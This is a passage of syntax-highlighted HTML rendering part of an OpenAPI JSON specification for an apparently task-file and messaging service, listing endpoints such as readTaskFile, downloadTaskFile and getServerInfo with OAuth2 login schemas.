class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"200"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Successful Response"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"security"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token property">"OAuth2PasswordBearer"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"/message_sent"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"get"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"summary"</span><span class="token operator">:</span> <span class="token string">"Message Sent"</span><span class="token punctuation">,</span>        <span class="token property">"operationId"</span><span class="token operator">:</span> <span class="token string">"message_sent_message_sent_get"</span><span class="token punctuation">,</span>        <span class="token property">"responses"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"200"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Successful Response"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"security"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token property">"OAuth2PasswordBearer"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"/messageBox"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"get"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"summary"</span><span class="token operator">:</span> <span class="token string">"Messagebox"</span><span class="token punctuation">,</span>        <span class="token property">"operationId"</span><span class="token operator">:</span> <span class="token string">"messageBox_messageBox_get"</span><span class="token punctuation">,</span>        <span class="token property">"responses"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"200"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Successful Response"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"security"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token property">"OAuth2PasswordBearer"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"/listTaskFiles"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"get"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"summary"</span><span class="token operator">:</span> <span class="token string">"Listtaskfiles"</span><span class="token punctuation">,</span>        <span class="token property">"operationId"</span><span class="token operator">:</span> <span class="token string">"listTaskFiles_listTaskFiles_get"</span><span class="token punctuation">,</span>        <span class="token property">"security"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token property">"OAuth2PasswordBearer"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"parameters"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"path"</span><span class="token punctuation">,</span>            <span class="token property">"in"</span><span class="token operator">:</span> <span class="token string">"query"</span><span class="token punctuation">,</span>            <span class="token property">"required"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>            <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span><span class="token punctuation">,</span>              <span class="token property">"default"</span><span class="token operator">:</span> <span class="token string">"taskfiles"</span><span class="token punctuation">,</span>              <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Path"</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"responses"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"200"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Successful Response"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token property">"422"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Validation Error"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                  <span class="token property">"$ref"</span><span class="token operator">:</span> <span class="token string">"#/components/schemas/HTTPValidationError"</span>                <span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"/readTaskFile"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"get"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"summary"</span><span class="token operator">:</span> <span class="token string">"Readtaskfile"</span><span class="token punctuation">,</span>        <span class="token property">"operationId"</span><span class="token operator">:</span> <span class="token string">"readTaskFile_readTaskFile_get"</span><span class="token punctuation">,</span>        <span class="token property">"security"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token property">"OAuth2PasswordBearer"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"parameters"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"path"</span><span class="token punctuation">,</span>            <span class="token property">"in"</span><span class="token operator">:</span> <span class="token string">"query"</span><span class="token punctuation">,</span>            <span class="token property">"required"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>            <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span><span class="token punctuation">,</span>              <span class="token property">"default"</span><span class="token operator">:</span> <span class="token string">"taskfiles"</span><span class="token punctuation">,</span>              <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Path"</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token punctuation">&#123;</span>            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"file_name"</span><span class="token punctuation">,</span>            <span class="token property">"in"</span><span class="token operator">:</span> <span class="token string">"query"</span><span class="token punctuation">,</span>            <span class="token property">"required"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>            <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span><span class="token punctuation">,</span>              <span class="token property">"default"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>              <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"File Name"</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"responses"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"200"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Successful Response"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token property">"422"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Validation Error"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                  <span class="token property">"$ref"</span><span class="token operator">:</span> <span class="token string">"#/components/schemas/HTTPValidationError"</span>                <span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"/downloadTaskFile"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"get"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"summary"</span><span class="token operator">:</span> <span class="token string">"Downloadtaskfile"</span><span class="token punctuation">,</span>        <span class="token property">"operationId"</span><span class="token operator">:</span> <span class="token string">"downloadTaskFile_downloadTaskFile_get"</span><span class="token punctuation">,</span>        <span class="token property">"security"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token property">"OAuth2PasswordBearer"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"parameters"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"url"</span><span class="token punctuation">,</span>            <span class="token property">"in"</span><span class="token operator">:</span> <span class="token string">"query"</span><span class="token punctuation">,</span>            <span class="token property">"required"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>            <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span><span class="token punctuation">,</span>              <span class="token property">"default"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>              <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Url"</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"responses"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"200"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Successful Response"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token property">"422"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Validation Error"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                  <span class="token property">"$ref"</span><span class="token operator">:</span> <span class="token string">"#/components/schemas/HTTPValidationError"</span>                <span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"/getPhone"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"get"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"summary"</span><span class="token operator">:</span> <span class="token string">"Getphone"</span><span class="token punctuation">,</span>        <span class="token property">"operationId"</span><span class="token operator">:</span> <span class="token string">"getPhone_getPhone_get"</span><span class="token punctuation">,</span>        <span class="token property">"responses"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"200"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Successful Response"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"security"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token property">"OAuth2PasswordBearer"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"/getServerInfo"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"get"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"summary"</span><span class="token operator">:</span> <span class="token string">"Getip"</span><span class="token punctuation">,</span>        <span class="token property">"operationId"</span><span class="token operator">:</span> <span class="token string">"getIP_getServerInfo_get"</span><span class="token punctuation">,</span>        <span class="token property">"responses"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"200"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Successful Response"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"security"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token property">"OAuth2PasswordBearer"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"/checkServer"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"get"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"summary"</span><span class="token operator">:</span> <span class="token string">"Checkserver"</span><span class="token punctuation">,</span>        <span class="token property">"operationId"</span><span class="token operator">:</span> <span class="token string">"checkServer_checkServer_get"</span><span class="token punctuation">,</span>        <span class="token property">"responses"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"200"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Successful Response"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token property">"components"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"schemas"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"Body_login_login_post"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"properties"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"grant_type"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"anyOf"</span><span class="token operator">:</span> <span class="token punctuation">[</span>              <span class="token punctuation">&#123;</span>                <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span><span class="token punctuation">,</span>                <span class="token property">"pattern"</span><span class="token operator">:</span> <span class="token string">"password"</span>              <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>              <span class="token punctuation">&#123;</span>                <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"null"</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Grant Type"</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token property">"username"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span><span class="token punctuation">,</span>            <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Username"</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token property">"password"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span><span class="token punctuation">,</span>            <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Password"</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token property">"scope"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span><span class="token punctuation">,</span>            <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Scope"</span><span class="token punctuation">,</span>            <span class="token property">"default"</span><span class="token operator">:</span> <span class="token string">""</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token property">"client_id"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"anyOf"</span><span class="token operator">:</span> <span class="token punctuation">[</span>              <span class="token punctuation">&#123;</span>                <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span>              <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>              <span class="token punctuation">&#123;</span>                <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"null"</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Client Id"</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token property">"client_secret"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"anyOf"</span><span class="token operator">:</span> <span class="token punctuation">[</span>              <span class="token punctuation">&#123;</span>                <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span>              <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>              <span class="token punctuation">&#123;</span>                <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"null"</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Client Secret"</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"object"</span><span class="token punctuation">,</span>        <span class="token property">"required"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token string">"username"</span><span class="token punctuation">,</span>          <span class="token string">"password"</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Body_login_login_post"</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token property">"HTTPValidationError"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"properties"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"detail"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"items"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"$ref"</span><span class="token operator">:</span> <span class="token string">"#/components/schemas/ValidationError"</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"array"</span><span class="token punctuation">,</span>            <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Detail"</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"object"</span><span class="token punctuation">,</span>        <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"HTTPValidationError"</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token property">"Token"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"properties"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"access_token"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span><span class="token punctuation">,</span>            <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Access Token"</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token property">"token_type"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span><span class="token punctuation">,</span>            <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Token Type"</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"object"</span><span class="token punctuation">,</span>        <span class="token property">"required"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token string">"access_token"</span><span class="token punctuation">,</span>          <span class="token string">"token_type"</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Token"</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token property">"ValidationError"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"properties"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"loc"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"items"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"anyOf"</span><span class="token operator">:</span> <span class="token punctuation">[</span>                <span class="token punctuation">&#123;</span>                  <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span>                <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                <span class="token punctuation">&#123;</span>                  <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"integer"</span>                <span class="token punctuation">&#125;</span>              <span class="token punctuation">]</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"array"</span><span class="token punctuation">,</span>            <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Location"</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token property">"msg"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span><span class="token punctuation">,</span>            <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Message"</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token property">"type"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span><span class="token punctuation">,</span>            <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Error Type"</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"object"</span><span class="token punctuation">,</span>        <span class="token property">"required"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token string">"loc"</span><span class="token punctuation">,</span>          <span class="token string">"msg"</span><span class="token punctuation">,</span>          <span class="token string">"type"</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"ValidationError"</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"securitySchemes"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"OAuth2PasswordBearer"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"oauth2"</span><span class="token punctuation">,</span>        <span class="token property">"flows"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"password"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"scopes"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token property">"tokenUrl"</span><span class="token operator">:</span> <span class="token string">"login"</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><s